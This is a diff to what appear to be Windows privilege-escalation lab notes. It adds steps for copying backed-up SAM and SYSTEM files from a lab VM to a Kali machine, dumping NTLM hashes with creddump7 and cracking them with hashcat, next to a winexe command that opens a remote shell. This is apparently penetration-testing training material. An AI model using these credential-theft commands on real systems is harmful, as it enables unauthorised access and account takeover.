@@ -337,3 +337,20 @@ Windows stores all the necessary data that is related to services in the registr
    * winexe -U 'admin%password' //ip_of_victim cmd.exe
    
  # Security Account Manager Passwords
+ 
+ * The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
+ * Transfer the SAM and SYSTEM files to your Kali VM:
+   * copy C:\Windows\Repair\SAM \\ip\kali\
+   * copy C:\Windows\Repair\SYSTEM \\ip\kali\
+   
+ * On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
+
+  * git clone https://github.com/Neohapsis/creddump7.git
+  * sudo apt install python-crypto
+  * python2 creddump7/pwdump.py SYSTEM SAM
+  
+* Crack the admin NTLM hash using hashcat:
+  * hashcat -m 1000 --force \<hash> /usr/share/wordlists/rockyou.txt
+  
+
+
